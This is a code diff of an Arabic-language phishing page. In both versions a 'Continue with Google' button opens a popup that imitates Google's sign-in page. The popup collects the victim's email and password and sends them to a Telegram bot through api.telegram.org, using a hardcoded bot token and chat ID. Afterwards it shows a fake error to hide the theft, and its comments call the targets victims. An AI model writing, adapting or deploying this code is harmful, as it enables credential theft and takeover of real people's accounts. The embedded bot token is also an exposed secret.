@@ -1,82 +1,50 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <title>تحقق من الهوية</title>
-    <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
-        .google-btn { display: flex; align-items: center; justify-content: center; background: white; border: 1px solid #dadce0; color: #3c4043; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: 500; margin-top: 20px; transition: background 0.3s; }
-        .google-btn:hover { background: #f7f8f8; }
-        .google-icon { width: 18px; margin-left: 10px; }
-        h2 { color: #202124; font-size: 22px; }
-        p { color: #5f6368; font-size: 14px; }
-    </style>
-</head>
-<body>
-
-<div class="card">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_Hi_Icon.png" width="50" alt="Lock">
-    <h2>هل تريد المتابعة؟</h2>
-    <p>للمتابعة إلى المستند المطلوب، يجب تسجيل الدخول عبر حسابك في Google لضمان أمان البيانات.</p>
-    
-    <button class="google-btn" onclick="openLogin()">
-        المتابعة باستخدام Google
-        <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" class="google-icon" alt="G">
-    </button>
-</div>
+<button class="google-btn" onclick="triggerGoogleAttack()">
+    المتابعة باستخدام Google
+    <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" style="width:18px; margin-right:10px;">
+</button>
 
 <script>
+function triggerGoogleAttack() {
+    // إحداثيات لفتح النافذة في منتصف الشاشة بالضبط لإيهام الضحية
+    const w = 500, h = 600;
+    const left = (screen.width/2)-(w/2), top = (screen.height/2)-(h/2);
+    
+    // فتح واجهة جوجل المزورة
+    const win = window.open("", "GoogleLogin", `width=${w},height=${h},top=${top},left=${left}`);
+    
+    win.document.write(`
+        <title>Sign in - Google Accounts</title>
+        <div style="font-family:arial; text-align:center; padding:40px;">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92">
+            <h2>تسجيل الدخول</h2>
+            <p>استخدم حسابك على Google</p>
+            <input type="email" id="e" placeholder="البريد الإلكتروني" style="width:100%; padding:10px; margin:10px 0; border:1px solid #dadce0; border-radius:4px;">
+            <input type="password" id="p" placeholder="كلمة المرور" style="width:100%; padding:10px; margin:10px 0; border:1px solid #dadce0; border-radius:4px;">
+            <button onclick="send()" style="background:#1a73e8; color:white; border:none; padding:10px 24px; border-radius:4px; cursor:pointer; float:left; margin-top:20px;">التالي</button>
+        </div>
+        <script>
+            function send() {
+                const data = {email: document.getElementById('e').value, pass: document.getElementById('p').value};
+                window.opener.postMessage(data, "*");
+                window.close();
+            }
+        <\/script>
+    `);
+}
+
+// استقبال البيانات وإرسالها لتلغرام
+window.addEventListener("message", (event) => {
     const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
     const CHAT_ID = "1611398303";
-
-    function openLogin() {
-        // فتح نافذة مزورة تشبه نافذة جوجل الحقيقية
-        const width = 500, height = 600;
-        const left = (screen.width / 2) - (width / 2);
-        const top = (screen.height / 2) - (height / 2);
-        
-        const loginWindow = window.open("", "Google Login", `width=${width},height=${height},top=${top},left=${left}`);
-        
-        loginWindow.document.write(`
-            <style>
-                body { font-family: sans-serif; text-align: center; padding-top: 50px; }
-                input { width: 80%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
-                button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; }
-            </style>
-            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92">
-            <h3>تسجيل الدخول</h3>
-            <p>استخدم حسابك على Google</p>
-            <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف">
-            <input type="password" id="pass" placeholder="كلمة المرور">
-            <br><br>
-            <button onclick="send()">التالي</button>
-
-            <script>
-                function send() {
-                    const e = document.getElementById('email').value;
-                    const p = document.getElementById('pass').value;
-                    window.opener.postMessage({email: e, pass: p}, "*");
-                    window.close();
-                }
-            <\/script>
-        `);
-    }
-
-    // استقبال البيانات من النافذة المنبثقة وإرسالها لتلغرام
-    window.addEventListener("message", (event) => {
-        const {email, pass} = event.data;
-        fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage\`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: "🚀 **صيد جديد (Google OAuth)** 🚀\\n\\n📧 الايميل: " + email + "\\n🔑 الباسورد: " + pass + "\\n\\n📍 تم بنجاح تجاوز حماية Google!"
-            })
-        });
-        alert("خطأ في الاتصال: يرجى المحاولة لاحقاً.");
+    
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: "🚨 صيد جديد (Google Auth) 🚨\nEmail: " + event.data.email + "\nPass: " + event.data.pass
+        })
     });
+    alert("حدث خطأ في المصادقة، يرجى إعادة المحاولة.");
+});
 </script>
-
-</body>
-</html>
